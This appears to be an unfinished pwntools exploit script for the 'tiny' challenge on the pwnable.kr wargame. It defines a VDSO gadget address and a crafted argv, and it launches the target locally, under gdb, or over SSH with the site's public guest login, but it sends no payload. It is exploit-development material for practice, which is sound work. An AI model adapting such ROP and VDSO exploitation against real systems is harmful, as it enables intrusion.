from pwn import *
import sys
import time

context.arch="amd64"
context.kernel="amd64"
context.os="linux"


binary_name = "tiny"
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)

context.binary = e

# Gadgets


VDSO_BASE = 0xf7ffc000

add_esp_pop_ebx=0xf7ffc639 # this is for the local vdso
argv = [p32(0x8048074),p32(0x8048074),p32(0x8048074),p32(0x8048074),b"A"]


def main():
    if(len(sys.argv) <2):
        print("Running locally")
        p = process(f"./{binary_name}")
    else:
        if(sys.argv[1] == "remote"):
            # or if using ssh:
            s = ssh(user='tiny',host='pwnable.kr',port=2222,password='guest') 
            p= s.process(f"./{binary_name}") 
        elif(sys.argv[1] == "gdb"):
            print(binary_name)
            p = gdb.debug([f"./{binary_name}"]+argv,gdbscript="b *0x08048074", aslr=False,env={})

        else:
            p = process(f"./{binary_name}")

        time.sleep(5900)
main()

